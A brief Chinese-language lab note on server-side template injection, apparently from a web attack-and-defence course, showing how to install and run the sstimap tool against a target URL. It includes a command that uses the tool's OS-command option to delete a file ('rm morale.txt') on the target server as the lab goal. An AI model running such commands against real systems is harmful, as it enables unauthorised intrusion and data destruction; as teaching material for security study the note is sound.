# Web攻防-SSTI服务端&模版注入&利用分类&语言引擎&数据渲染&项目工具&挖掘思路

![6e49179e182fe6acd64c594ec61a6877](images/6e49179e182fe6acd64c594ec61a6877.png)

```JAVA


```

## 利用工具sstimap   

安装库

```
 E:\python3.8\Scripts\pip.exe install -r .\requirements.txt
```

运行

```
E:\python3.8\python.exe .\sstimap.py
```

测试时需要关闭代理

```
E:\python3.8\python.exe .\sstimap.py -u "目标网址"
```

模板类型 系统 权限 命令

![image-20260613120303602](images/image-20260613120303602.png)

删除 morale.txt 完成目标

```
 E:\python3.8\python.exe .\sstimap.py -u "网址" --os-cmd "rm morale.txt"
```

![image-20260615114622064](images/image-20260615114622064.png)

![image-20260615114631350](images/image-20260615114631350.png)
